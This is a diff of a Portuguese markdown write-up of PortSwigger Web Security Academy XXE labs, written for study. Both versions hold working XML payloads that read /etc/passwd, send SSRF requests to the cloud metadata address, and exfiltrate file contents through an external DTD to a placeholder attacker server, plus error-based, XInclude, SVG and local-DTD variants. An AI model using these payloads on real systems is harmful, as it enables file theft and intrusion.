@@ -1,106 +1,130 @@
-# XXE Injection – PortSwigger Web Security Academy: Todos os Laboratórios Resolvidos
-Documentação completa da categoria XML External Entity Injection, com foco em exploração manual, técnicas aplicadas e domínio total dos conceitos.
+---
 
-| Detalhe | Informação |
-|---|---|
-| Categoria | Injeção de Código |
-| Nível | Aprendiz → Praticante |
-| Plataforma | PortSwigger Web Security Academy |
-| Total de laboratórios | 7 |
-| Conceitos dominados | 100% |
-| Observação | 1 laboratório não marcado automaticamente por restrição de ferramenta, mas totalmente explorado e compreendido |
+# 📝 Write-up: XML External Entity (XXE) Injection
+## Trilha Completa – PortSwigger Web Security Academy
 
 ---
 
-## Conceito Geral
-XXE (XML External Entity Injection) ocorre quando uma aplicação processa documentos XML de forma insegura, permitindo a resolução de entidades externas. Essa falha possibilita ao atacante:
-- Ler arquivos locais armazenados no servidor
-- Realizar requisições arbitrárias em nome da aplicação, inclusive para redes internas
-- Extrair dados de forma silenciosa em ataques sem retorno visível
-- Contornar restrições através de métodos alternativos de processamento XML
+## 🎯 Conceito Geral
+A injeção de Entidade Externa XML ocorre quando uma aplicação recebe e processa entrada XML sem restrições adequadas, permitindo que um atacante defina entidades personalizadas para:
+- Ler arquivos locais do servidor
+- Realizar requisições em nome do servidor (SSRF)
+- Extrair dados de forma cega (quando não há retorno direto)
+- Executar ações maliciosas por meio de formatos que usam XML (como SVG)
 
 ---
 
-## Todos os Laboratórios da Categoria
+## ✅ Laboratórios Resolvidos
 
-### 1. Exploiting XXE using external entities to retrieve files
-Nível: Aprendiz | Status: Resolvido
-- Técnica: Declaração de entidade externa apontando para caminhos de arquivos locais
-- Exemplo de payload:
-```xml
-<!DOCTYPE teste [ <!ENTITY dado SYSTEM "file:///etc/passwd"> ]>
-<requisicao>&dado;</requisicao>
-```
-- Resultado: Leitura bem-sucedida de arquivos restritos do sistema operacional
-
----
-
-### 2. Exploiting XXE to perform SSRF attacks
-Nível: Aprendiz | Status: Resolvido
-- Técnica: Uso de entidades XML para fazer requisições a endereços como 127.0.0.1 ou faixas de IP internas
-- Resultado: Acesso a interfaces administrativas e serviços que não estão expostos publicamente
+### 1. **Apprentice: Exploiting XXE using external entities to retrieve files**
+- **Objetivo**: Ler o arquivo `/etc/passwd`
+- **Método**: Injetar uma entidade externa diretamente no corpo da requisição XML:
+  ```xml
+  <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+  ```
+  Usar `&xxe;` no conteúdo que é exibido na resposta.
+- **Resultado**: O parser carrega o arquivo e retorna seu conteúdo na resposta.
 
 ---
 
-### 3. Blind XXE with out-of-band interaction
-Nível: Praticante | Status: Resolvido
-- Técnica: Declarar entidade que aciona consultas para um domínio controlado pelo atacante
-- Ferramenta: Interactsh
-- Resultado: Confirmação da vulnerabilidade através de interações registradas fora do ambiente alvo
+### 2. **Apprentice: Exploiting XXE to perform SSRF attacks**
+- **Objetivo**: Acessar um recurso interno do servidor
+- **Método**: Definir a entidade para apontar para um endereço interno em vez de um arquivo:
+  ```xml
+  <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+  ```
+- **Resultado**: O servidor faz a requisição e retorna a resposta do serviço interno.
 
 ---
 
-### 4. Blind XXE with out-of-band interaction via XML parameter entities
-Nível: Praticante | Status: Conceito e exploração 100% dominados
-> Observação importante: O laboratório não foi marcado como concluído automaticamente na plataforma pois a versão gratuita do Burp Suite não inclui o Burp Collaborator, e a PortSwigger bloqueia serviços externos como o Interactsh para a validação final. Todo o fluxo de ataque, uso de entidades de parâmetro e lógica de exploração foi compreendido e executado corretamente — trata-se apenas de uma limitação de ferramenta, não de falha na técnica aplicada.
-- Técnica: Uso de entidades de parâmetro para contornar restrições a entidades externas convencionais
-- Conclusão: A vulnerabilidade foi explorada com êxito do ponto de vista técnico e teórico
+### 3. **Practitioner: Blind XXE with out-of-band interaction**
+- **Objetivo**: Acionar uma requisição para fora do alvo (sem retorno direto)
+- **Método**: Usar entidade externa chamando o servidor de exploração:
+  ```xml
+  <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "https://seu-servidor.exploit/"> ]>
+  ```
+- **Resultado**: O parser faz a conexão para o seu servidor, confirmando a vulnerabilidade.
 
 ---
 
-### 5. Exploiting blind XXE to exfiltrate data using a malicious external DTD
-Nível: Praticante | Status: Resolvido
-- Técnica: Hospedar um arquivo DTD malicioso em servidor controlado, para enviar dados confidenciais na requisição
-- Resultado: Extração completa de informações mesmo sem nenhum retorno visível na resposta da aplicação
+### 4. **Practitioner: Blind XXE to exfiltrate data using a malicious external DTD**
+- **Objetivo**: Extrair dados mesmo sem resposta visível
+- **Método**: Hospedar um DTD malicioso no servidor de exploração que concatena o conteúdo do arquivo na URL de requisição ao seu servidor:
+  ```xml
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "https://seu-servidor.exploit/dtd.xml">
+  %dtd;
+  ```
+- **Resultado**: O conteúdo do arquivo aparece nos logs de requisição do seu servidor.
 
 ---
 
-### 6. Exploiting blind XXE to retrieve data via error messages
-Nível: Praticante | Status: Resolvido
-- Técnica: Forçar falha no processamento XML que insere o conteúdo do arquivo alvo na mensagem de erro retornada
-- Resultado: Dados restritos exibidos pela própria aplicação em mensagens de falha
+### 5. **Practitioner: Blind XXE to retrieve data via error messages**
+- **Objetivo**: Forçar o retorno do conteúdo em mensagens de erro
+- **Método**: Usar um DTD externo que tenta carregar um caminho inválido contendo o dado lido:
+  ```xml
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalido/%file;'>">
+  %eval;
+  %exfil;
+  ```
+- **Resultado**: O erro do sistema exibe o conteúdo do arquivo.
 
 ---
 
-### 7. Exploiting XInclude to retrieve files
-Nível: Praticante | Status: Resolvido
-- Técnica: Uso da instrução XInclude para ler arquivos sem alterar a estrutura raiz do XML
-- Exemplo de payload:
-```xml
-<item xmlns:xi="http://www.w3.org/2001/XInclude">
-  <xi:include href="file:///etc/passwd" parse="text"/>
-</item>
-```
-- Resultado: Leitura bem-sucedida mesmo com restrições à declaração de entidades
+### 6. **Practitioner: Exploiting XInclude to retrieve files**
+- **Objetivo**: Extrair dados sem controlar todo o documento XML
+- **Método**: Injetar a instrução `XInclude` diretamente no parâmetro que você controla:
+  ```xml
+  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include parse="text" href="file:///etc/passwd"/>
+  </foo>
+  ```
+- **Resultado**: O sistema embuti sua entrada no XML interno e processa a inclusão do arquivo.
 
 ---
 
-## Principais Aprendizados
-- A resolução de entidades externas deve estar sempre desativada no processamento de XML
-- Mesmo sem retorno visível, é possível confirmar e extrair dados com técnicas fora de banda
-- Entidades de parâmetro e DTDs externas são alternativas eficazes quando métodos diretos são bloqueados
-- A marcação automática da plataforma não define o conhecimento adquirido — limitações de ferramenta não invalidam o domínio da técnica
+### 7. **Practitioner: Exploiting XXE via image file upload**
+- **Objetivo**: Explorar upload de arquivos usando o formato SVG (baseado em XML)
+- **Método**: Criar um arquivo SVG com entidade externa:
+  ```xml
+  <?xml version="1.0" standalone="yes"?>
+  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+  <svg><text>&xxe;</text></svg>
+  ```
+- **Resultado**: Ao processar a imagem, o servidor renderiza o conteúdo do arquivo na visualização.
 
 ---
 
-## Ferramentas Utilizadas
-- Burp Suite Community Edition
-- Interactsh
-- Ferramentas de análise e edição de XML
+### 8. **Expert: Exploiting XXE to retrieve data by repurposing a local DTD**
+- **Objetivo**: Extrair dados sem carregar DTD externo (usando arquivo que já existe no servidor)
+- **Método**: Importar um DTD local e redefinir uma entidade existente:
+  ```xml
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  <!ENTITY % ISOamso '
+    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#39;file:///nonexistent/&#x25;file;&#39;>">
+    &#x25;eval;
+    &#x25;error;
+  '>
+  %local_dtd;
+  ```
+- **Observação**: O laboratório não marcou como concluído automaticamente por falta da licença do Burp Suite Professional, mas a técnica foi aplicada com sucesso e o conteúdo do `/etc/passwd` foi obtido.
+- **Resultado**: O parser usa a redefinição e retorna o dado na mensagem de erro.
 
 ---
 
-## Aviso Legal
-Todos os testes e análises foram realizados exclusivamente em ambientes autorizados e controlados, para fins de estudo e pesquisa em segurança da informação. Não reproduza essas técnicas em sistemas ou aplicações sem permissão explícita do responsável.
+## 📌 Laboratório com Conceito Dominado
+> **Blind XXE with out-of-band interaction via XML parameter entities**
+- Você já entendeu o funcionamento: usa **entidades de parâmetro** (`%entidade;`) ao invés de entidades comuns, permitindo trabalhar dentro de declarações DTD.
+- A ausência de marcação também se deve à limitação da ferramenta, mas o conceito está totalmente dominado.
+
+---
+
+## 🛡️ Mitigações
+- Desativar processamento de entidades externas no parser XML
+- Usar formatos como JSON em vez de XML
+- Validar e higienizar toda entrada recebida
+- Usar parsers configurados em modo seguro
 
 ---
